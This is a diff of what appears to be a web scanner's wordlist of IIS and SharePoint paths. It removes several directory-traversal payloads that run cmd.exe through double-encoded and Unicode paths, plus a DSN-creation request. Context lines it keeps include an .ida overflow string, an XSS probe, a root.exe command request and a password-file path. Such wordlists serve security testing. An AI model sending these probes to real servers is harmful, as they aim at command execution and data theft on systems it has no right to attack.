@@ -1,5 +1,3 @@
-%NETHOOD%/
-..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
 .printer
 /x.ida?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=X
 <script>alert('XSS')</script>.aspx
@@ -10,7 +8,6 @@ _layouts/settings.htm
 _layouts/userinfo.htm
 _mem_bin
 _mem_bin/
-_mem_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
 _mem_bin/autoconfig.asp
 _mem_bin/formslogin.asp
 _private
@@ -20,7 +17,6 @@ _vti_aut
 _vti_aut/
 _vti_bin
 _vti_bin/
-_vti_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
 _vti_bin/_vti_aut/dvwssr.dll
 _vti_bin/_vti_aut/fp30reg.dll
 _vti_bin/_vti_aut/fp30reg.dll?1234=X
@@ -43,7 +39,6 @@ _vti_pvt/users.pwd
 _vti_script
 _vti_txt
 _WEB_INF/
-a%5c.aspx
 AccessPlatform/
 AccessPlatform/auth/
 AccessPlatform/auth/clientscripts/
@@ -81,7 +76,6 @@ bins/
 certcontrol/
 certenroll/
 certsrv/
-cfide/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
 CFIDE/Administrator/startstop.html
 cgi
 cgi-bin
@@ -164,12 +158,10 @@ Micros~1
 Micros~1/
 msadc
 msadc/
-msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
 msadc/Samples/selector/showcode.asp
 msdac/root.exe?/c+dir
 mspress30
 null.htw
-null.htw?CiWebHitsFile=/default.asp%20&CiRestriction=none&CiHilite
 OMA/
 OWA/
 pbserver
@@ -189,9 +181,6 @@ samples
 samples/
 scripts
 scripts/
-scripts/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
-scripts/..%c0%af..%c0%afwinnt/system32/cmd.exe?/c+dir+c:\\
-scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\\
 scripts/cgimail.exe
 scripts/convert.bas
 scripts/counter.exe
@@ -230,7 +219,6 @@ system/
 system_web
 system_web/
 test/
-tools/newdsn.exe?driver=Microsoft%2BAccess%2BDriver%2B%28*.mdb%29&dsn=goatfart+samples+from+microsoft&dbq=..%2F..%2Fwwwroot%2goatfart.html&newdb=CREA
 tsweb/
 vc30
 web
